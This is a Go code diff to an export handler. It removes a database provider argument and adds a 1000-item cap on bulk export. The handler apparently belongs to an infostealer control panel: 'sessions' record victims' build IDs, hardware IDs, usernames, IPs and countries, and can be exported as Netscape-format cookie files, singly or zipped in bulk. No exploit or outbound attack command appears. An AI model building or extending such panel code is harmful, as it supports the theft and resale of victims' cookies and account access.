@@ -15,12 +15,11 @@ import (
 )
 
 type ExportHandler struct {
-	db       *sql.DB
-	provider db.ProviderType
+	db *sql.DB
 }
 
-func NewExportHandler(db *sql.DB, provider db.ProviderType) *ExportHandler {
-	return &ExportHandler{db: db, provider: provider}
+func NewExportHandler(db *sql.DB) *ExportHandler {
+	return &ExportHandler{db: db}
 }
 
 func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
@@ -40,7 +39,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 
 	// Check session lock - hide sensitive data if locked by another
 	var lockedBy string
-	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
@@ -63,7 +62,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		CountryCode string
 		CreatedAt   string
 	}
-	err := db.QueryRow(h.db, h.provider, `
+	err := db.QueryRow(h.db, `
 		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
 		FROM sessions WHERE id = ?`, id).Scan(
 		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
@@ -78,7 +77,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if !sessionOwnedBy(h.db, h.provider, r, id) {
+	if !sessionOwnedBy(h.db, r, id) {
 		writeError(w, http.StatusForbidden, "access denied")
 		return
 	}
@@ -176,20 +175,20 @@ func (h *ExportHandler) exportNetscape(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var lockedBy string
-	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
 	}
 
 	var exists bool
-	err := db.QueryRow(h.db, h.provider, "SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
+	err := db.QueryRow(h.db, "SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
 	if err != nil || !exists {
 		writeError(w, http.StatusNotFound, "session not found")
 		return
 	}
 
-	if !sessionOwnedBy(h.db, h.provider, r, sessionID) {
+	if !sessionOwnedBy(h.db, r, sessionID) {
 		writeError(w, http.StatusForbidden, "access denied")
 		return
 	}
@@ -243,6 +242,10 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusBadRequest, "ids required")
 		return
 	}
+	if len(req.IDs) > 1000 {
+		writeError(w, http.StatusBadRequest, "too many session ids (max 1000)")
+		return
+	}
 
 	format := r.URL.Query().Get("format")
 	ext := ".json"
@@ -256,12 +259,12 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 	zw := zip.NewWriter(&buf)
 
 	for _, id := range req.IDs {
-		if !sessionOwnedBy(h.db, h.provider, r, id) {
+		if !sessionOwnedBy(h.db, r, id) {
 			continue
 		}
 
 		var lockedBy string
-		locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+		locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 		if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 			continue
 		}
@@ -321,7 +324,7 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 			var s struct {
 				ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
 			}
-			err = db.QueryRow(h.db, h.provider, `
+			err = db.QueryRow(h.db, `
 				SELECT id, build_id, hwid, os, username, ip, country_code, created_at
 				FROM sessions WHERE id = ?`, id).Scan(
 				&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
@@ -362,7 +365,7 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *ExportHandler) ExportUserAgents(w http.ResponseWriter, r *http.Request) {
-	rows, err := db.Query(h.db, h.provider, "SELECT user_agent FROM system_info WHERE user_agent IS NOT NULL AND user_agent != ''")
+	rows, err := db.Query(h.db, "SELECT user_agent FROM system_info WHERE user_agent IS NOT NULL AND user_agent != ''")
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to query user agents")
 		return
